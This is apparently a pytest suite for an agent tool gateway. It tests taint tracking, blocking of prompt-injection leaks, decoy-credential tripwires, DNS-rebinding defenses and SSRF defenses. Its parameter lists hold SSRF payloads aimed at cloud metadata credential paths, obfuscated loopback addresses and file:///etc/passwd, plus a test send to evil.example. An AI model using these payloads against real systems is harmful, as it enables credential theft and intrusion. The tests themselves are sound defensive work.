"""Gateway placeholder tests. Run: pytest gateway"""

import os
import sys
from pathlib import Path

HERE = Path(__file__).parent
os.environ.update(FILES_DIR=str(HERE / "workspace/files"), GATEWAY_ADMIN_KEY="adm",
                  APPROVED_DESTINATIONS='{"api.internal.example": "sensitive"}', OFFLINE="1", ADMIN_SOURCES="any")
sys.path.insert(0, str(HERE))

import pytest  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

import app as gw  # noqa: E402
from policy import SessionState, decide_action, decide_egress  # noqa: E402

APPROVED = {"api.internal.example": "sensitive"}


# ---------- rules ----------

def state(*reads):
    s = SessionState("s")
    for t in reads:
        s.absorb("x", t)
    return s


TRUSTED_PUBLIC = {"trust": "trusted", "sensitivity": "public"}
UNTRUSTED = {"trust": "untrusted", "sensitivity": "public"}
SENSITIVE = {"trust": "trusted", "sensitivity": "sensitive"}
SECRET = {"trust": "trusted", "sensitivity": "secret"}
BAIT = {"trust": "trusted", "sensitivity": "secret", "bait": True}


def test_tags_combine_lowest_trust_highest_sensitivity():
    s = state(TRUSTED_PUBLIC, UNTRUSTED, SENSITIVE)
    assert s.tags() == {"trust": "untrusted", "sensitivity": "sensitive", "bait": False}
    s.absorb("y", TRUSTED_PUBLIC)  # never relaxes
    assert s.trust == "untrusted" and s.sensitivity == "sensitive"


def test_untagged_is_unknown_and_sensitive():
    assert state(None).tags() == {"trust": "unknown", "sensitivity": "sensitive", "bait": False}


@pytest.mark.parametrize("reads, kind, expected", [
    ([TRUSTED_PUBLIC], "delete", "allow"),
    ([UNTRUSTED], "delete", "block"),
    ([None], "credentials", "ask"),
    ([UNTRUSTED], "read_calendar", "allow"),
    ([BAIT], "anything", "block"),
])
def test_action_rules(reads, kind, expected):
    assert decide_action(state(*reads), kind).decision == expected


@pytest.mark.parametrize("reads, host, expected, rule", [
    ([TRUSTED_PUBLIC], "example.com", "allow", "default"),
    ([SENSITIVE], "example.com", "ask", "R2-destination"),
    ([SENSITIVE], "api.internal.example", "allow", "default"),
    ([SECRET], "api.internal.example", "block", "R2-destination"),
    ([UNTRUSTED, SENSITIVE], "api.internal.example", "block", "R3-injection-leak"),
    ([BAIT], "api.internal.example", "block", "R4-bait"),
])
def test_egress_rules(reads, host, expected, rule):
    d = decide_egress(state(*reads), host, APPROVED)
    assert (d.decision, d.rule) == (expected, rule)


# ---------- HTTP ----------

@pytest.fixture
def client(monkeypatch):
    gw.sessions.clear(); gw.events.clear(); gw.alerts.clear()
    monkeypatch.setattr(gw, "resolve_token", lambda t: {"tok-a": "a", "tok-b": "b"}.get(t))
    return TestClient(gw.app)


def call(c, tok, path, body=None):
    h = {"Authorization": f"Bearer {tok}"}
    return c.post(path, json=body, headers=h) if body is not None else c.get(path, headers=h)


def test_requires_session_token(client):
    assert call(client, "nope", "/tools/list_files").status_code == 401


def test_prompt_injection_leak_is_blocked(client):
    assert call(client, "tok-a", "/tools/read_file", {"path": "web/downloaded-page.html"}).status_code == 200
    assert call(client, "tok-a", "/tools/read_file", {"path": "docs/q3-plan.md"}).status_code == 200
    r = call(client, "tok-a", "/tools/send", {"url": "https://api.internal.example/x", "body": "plan"})
    assert r.status_code == 403 and r.json()["detail"]["rule"] == "R3-injection-leak"
    alerts = client.get("/admin/alerts", headers={"Authorization": "Bearer adm"}).json()
    assert len(alerts) == 1 and alerts[0]["session_id"] == "a"


def test_sessions_are_tracked_separately(client):
    call(client, "tok-a", "/tools/read_file", {"path": "web/downloaded-page.html"})
    r = call(client, "tok-b", "/tools/action", {"kind": "delete", "target": "x"})
    assert r.status_code == 200  # b never read untrusted content


def test_decoy_read_locks_session(client):
    call(client, "tok-a", "/tools/read_file", {"path": ".decoy/aws-credentials"})
    r = call(client, "tok-a", "/tools/fetch_url", {"url": "https://example.com"})
    assert r.status_code == 403 and r.json()["detail"]["rule"] == "R4-bait"


def test_fetched_page_taints_session(client):
    assert call(client, "tok-a", "/tools/fetch_url", {"url": "https://example.com"}).status_code == 200
    r = call(client, "tok-a", "/tools/action", {"kind": "permissions"})
    assert r.json()["detail"]["rule"] == "R1-untrusted-risky"


def test_path_traversal_rejected(client):
    assert call(client, "tok-a", "/tools/read_file", {"path": "../tags.json"}).status_code == 400
    assert call(client, "tok-a", "/tools/read_file", {"path": "/etc/passwd"}).status_code == 400


def test_admin_requires_key(client):
    assert client.get("/admin/sessions").status_code == 401
    call(client, "tok-a", "/tools/list_files")
    r = client.get("/admin/sessions/a/events", headers={"Authorization": "Bearer adm"})
    assert r.json()[0]["kind"] == "list_files"


def test_risk_layer_can_only_tighten(client, monkeypatch):
    class R:
        def __init__(self, d): self.d = d
        def json(self): return {"decision": self.d, "reason": "risk says so"}
    monkeypatch.setattr(gw, "RISK_URL", "http://risk")
    monkeypatch.setattr(gw.httpx, "post", lambda *a, **k: R("allow"))
    call(client, "tok-a", "/tools/read_file", {"path": "secrets/api-keys.txt"})
    r = call(client, "tok-a", "/tools/send", {"url": "https://example.com"})
    assert r.json()["detail"]["decision"] == "block"  # risk "allow" can't relax a block
    monkeypatch.setattr(gw.httpx, "post", lambda *a, **k: R("block"))
    r = call(client, "tok-b", "/tools/send", {"url": "https://example.com"})
    assert r.json()["detail"]["rule"] == "risk-layer"


# ---------- R0: no internal destinations through the gateway ----------

from egress import check_destination  # noqa: E402


@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://host.docker.internal:9000/sessions",
    "http://localhost/admin/alerts",
    "http://127.0.0.1/",
    "http://2130706433/",            # 127.0.0.1 as a decimal
    "http://0x7f.1/",                # 127.0.0.1 in hex shorthand
    "http://[::1]/",
    "http://[::ffff:169.254.169.254]/",
    "http://10.0.0.5/",
    "http://172.17.0.1/",
    "http://192.168.1.1/",
    "http://gateway/admin",
    "http://a10-gateway/",
    "http://example.com:9000/",      # non-standard port
    "file:///etc/passwd",
    "ftp://example.com/",
    "http://user:pw@example.com/",
    "http://metadata.google.internal/",
])
def test_internal_destinations_blocked(url):
    assert check_destination(url, offline=False).reason, url


def test_name_resolving_to_private_ip_blocked():
    fake = lambda host, port: [(2, 1, 6, "", ("10.1.2.3", 0))]
    assert "10.1.2.3" in check_destination("https://innocent.example/", offline=False, resolve=fake).reason


def test_public_destination_allowed():
    fake = lambda host, port: [(2, 1, 6, "", ("93.184.216.34", 0))]
    c = check_destination("https://example.com/x", offline=False, resolve=fake)
    assert c.reason is None and c.addrs == ["93.184.216.34"]


def test_ssrf_through_gateway_is_blocked_and_alerts(client):
    r = call(client, "tok-a", "/tools/fetch_url", {"url": "http://169.254.169.254/latest/meta-data/"})
    assert r.status_code == 403 and r.json()["detail"]["rule"] == "R0-internal-destination"
    assert client.get("/admin/alerts", headers={"Authorization": "Bearer adm"}).json()[0]["rule"] == \
        "R0-internal-destination"


def test_admin_rejects_non_host_sources(client, monkeypatch):
    import ipaddress
    monkeypatch.setattr(gw, "ADMIN_NETS", [ipaddress.ip_network("172.17.0.0/16")])
    assert client.get("/admin/alerts", headers={"Authorization": "Bearer adm"}).status_code == 403


# ---------- model proxy (/llm) and MCP ----------

import llm  # noqa: E402


def test_sanitize_strips_server_side_tools():
    body = {"model": "m", "messages": [], "mcp_servers": [{"url": "https://x"}],
            "tools": [{"name": "Bash", "input_schema": {}},
                      {"type": "web_search_20250305", "name": "web_search"},
                      {"type": "web_fetch_20250910", "name": "web_fetch"},
                      {"type": "code_execution_20250825", "name": "code_execution"}]}
    out, removed = llm.sanitize(body)
    assert [t["name"] for t in out["tools"]] == ["Bash"]
    assert "mcp_servers" not in out and len(removed) == 4


@pytest.fixture
def mock_upstream(monkeypatch):
    """Route the proxy's upstream client to the in-process mock model."""
    import httpx
    import mock_llm
    monkeypatch.setattr(mock_llm, "TTFT_MS", 0)
    monkeypatch.setattr(mock_llm, "TOKEN_MS", 0)
    monkeypatch.setattr(llm, "API_KEY", mock_llm.MOCK_KEY)
    monkeypatch.setattr(llm, "UPSTREAM", "http://mock")
    monkeypatch.setattr(llm, "_client", httpx.AsyncClient(transport=httpx.ASGITransport(app=mock_llm.app)))
    return mock_llm


def test_llm_proxy_streams_and_injects_key(client, mock_upstream):
    r = client.post("/llm/v1/messages", headers={"Authorization": "Bearer tok-a", "anthropic-version": "2023-06-01"},
                    json={"model": "m", "max_tokens": 10, "stream": True, "messages": [{"role": "user", "content": "hi"}],
                          "tools": [{"type": "web_search_20250305", "name": "web_search"}]})
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/event-stream")
    assert "message_stop" in r.text and "Hello" in r.text
    assert "tools" not in mock_upstream.last  # server-side tool never reached the provider
    ev = client.get("/admin/sessions/a/events", headers={"Authorization": "Bearer adm"}).json()[-1]
    assert ev["kind"] == "llm_call" and ev["removed"] == ["tool:web_search_20250305"]
    assert not {"body", "content", "system"} & set(ev) and ev["messages"] == 1  # metadata only


def test_llm_proxy_rejects_bad_token_and_other_paths(client, mock_upstream):
    body = {"model": "m", "messages": []}
    assert client.post("/llm/v1/messages", json=body).status_code == 401
    assert client.post("/llm/v1/files", json=body, headers={"Authorization": "Bearer tok-a"}).status_code == 403
    assert client.get("/llm/v1/models", headers={"Authorization": "Bearer tok-a"}).status_code == 403


def test_llm_blocked_after_decoy(client, mock_upstream):
    call(client, "tok-a", "/tools/read_file", {"path": ".decoy/aws-credentials"})
    r = client.post("/llm/v1/messages", headers={"Authorization": "Bearer tok-a"},
                    json={"model": "m", "messages": [{"role": "user", "content": "hi"}]})
    assert r.status_code == 403 and r.json()["detail"]["rule"] == "R4-bait"


def test_llm_allowed_after_untrusted_plus_sensitive(client, mock_upstream):
    call(client, "tok-a", "/tools/read_file", {"path": "web/downloaded-page.html"})
    call(client, "tok-a", "/tools/read_file", {"path": "docs/q3-plan.md"})
    r = client.post("/llm/v1/messages", headers={"Authorization": "Bearer tok-a"},
                    json={"model": "m", "messages": [{"role": "user", "content": "hi"}]})
    assert r.status_code == 200  # the agent can keep thinking; R3 applies to agent-chosen destinations


def mcp_call(c, method, params=None, id_=1, tok="tok-a"):
    return c.post("/mcp", headers={"Authorization": f"Bearer {tok}"},
                  json={"jsonrpc": "2.0", "id": id_, "method": method, "params": params or {}})


def test_mcp_lists_and_calls_tools_through_rules(client):
    assert mcp_call(client, "initialize", {"protocolVersion": "2025-06-18"}).json()["result"]["serverInfo"]
    names = [t["name"] for t in mcp_call(client, "tools/list").json()["result"]["tools"]]
    assert names == ["list_files", "read_file", "fetch_url", "send", "action"]
    ok = mcp_call(client, "tools/call", {"name": "read_file", "arguments": {"path": "docs/readme.md"}}).json()
    assert ok["result"]["isError"] is False and "Project notes" in ok["result"]["content"][0]["text"]
    mcp_call(client, "tools/call", {"name": "read_file", "arguments": {"path": "web/downloaded-page.html"}})
    mcp_call(client, "tools/call", {"name": "read_file", "arguments": {"path": "docs/q3-plan.md"}})
    bad = mcp_call(client, "tools/call", {"name": "send", "arguments": {"url": "https://evil.example/x"}}).json()
    assert bad["result"]["isError"] and "R3-injection-leak" in bad["result"]["content"][0]["text"]
    ssrf = mcp_call(client, "tools/call", {"name": "fetch_url", "arguments": {"url": "http://169.254.169.254/"}},
                    tok="tok-b").json()
    assert "R0-internal-destination" in ssrf["result"]["content"][0]["text"]
    assert client.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).status_code == 401


# ---------- DNS rebinding: connect only to the vetted address ----------

import httpx  # noqa: E402
from egress import pinned_request  # noqa: E402


def test_pinned_request_uses_vetted_ip_and_keeps_host_and_sni():
    seen = {}

    def handler(request):
        seen.update(url=str(request.url), host=request.headers["host"],
                    sni=request.extensions.get("sni_hostname"))
        return httpx.Response(200, content=b"x" * 5000, headers={"content-type": "text/plain"})

    lookups = iter([[(2, 1, 6, "", ("93.184.216.34", 0))], [(2, 1, 6, "", ("169.254.169.254", 0))]])
    checked = check_destination("https://rebind.example/path?q=1", offline=False,
                                resolve=lambda h, p: next(lookups))  # first answer public...
    client = httpx.Client(transport=httpx.MockTransport(handler))
    status, _, body = pinned_request(client, "GET", "https://rebind.example/path?q=1", checked, max_bytes=1000)
    # ...and the second (rebound) answer is never consulted: the request went to the vetted IP.
    assert seen == {"url": "https://93.184.216.34/path?q=1", "host": "rebind.example", "sni": "rebind.example"}
    assert status == 200 and len(body) == 1000  # body capped


def test_redirects_are_not_followed():
    client = httpx.Client(transport=httpx.MockTransport(
        lambda r: httpx.Response(302, headers={"location": "http://169.254.169.254/"})))
    checked = check_destination("http://93.184.216.34/", offline=False)
    status, hdrs, _ = pinned_request(client, "GET", "http://93.184.216.34/", checked, max_bytes=100)
    assert status == 302 and hdrs["location"] == "http://169.254.169.254/"
